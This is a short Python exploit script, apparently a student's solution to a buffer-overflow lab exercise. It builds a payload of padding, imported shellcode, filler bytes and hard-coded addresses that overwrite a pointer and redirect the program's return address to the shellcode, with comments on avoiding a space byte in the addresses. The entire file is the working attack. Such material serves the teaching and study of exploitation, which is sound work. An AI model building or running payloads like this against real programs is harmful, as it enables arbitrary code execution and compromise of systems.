#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"A") # a very smart surprise tool to avoid having the address we are jumping have 20 in it
sys.stdout.buffer.write(shellcode) # 20 is counted as a space which messes with the arguement number
sys.stdout.buffer.write(b"0"*2024)
sys.stdout.buffer.write(pack("<I",0xfffead21)) # a = return address we want to jump to
sys.stdout.buffer.write(pack("<I",0xfffeb52c)) #very checky modify value of *p and a so we can indirectly modify the ret value
